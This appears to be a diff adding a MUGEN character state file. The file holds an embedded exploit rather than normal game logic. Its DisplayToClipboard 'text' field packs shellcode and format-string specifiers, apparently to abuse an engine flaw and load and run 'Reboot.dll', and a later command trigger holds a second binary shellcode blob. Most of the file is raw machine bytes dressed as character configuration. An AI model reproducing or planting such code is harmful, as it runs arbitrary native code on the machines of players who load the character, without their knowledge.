@@ -1,0 +1,17 @@
+[Statedef -3]
+[State CODE]
+type=DisplayToClipboard
+trigger1=1
+text="‰Ã‰Ä‰ØƒÀBP¸Ó¶ÿ÷Ðÿ…Àt‰ÚƒÂ<RP¸Ï¶ÿ÷Ðÿ…Àtj%cÿÐ1ÀP¸¶ÿ÷Ðÿ_run@4%c./chars/RebootKFM/DLL/Reboot.dll%-3998c55@%c¸üïÿÿÄÿà"
+params=palno,0,0,0
+persistent=256
+ignorehitpause=1
+[Statedef -4]
+[State ]
+type = Null
+trigger1 = command="ëC00000000000000000000000000000000000000000000000000000000000000]EE"
+ƒì`1Àf¸p‹‹L[K
+f¸ÐA‹f¸0¯ÈÊ1À‰Büa‹$fÇ
+"
+‰h{›G
+Ã
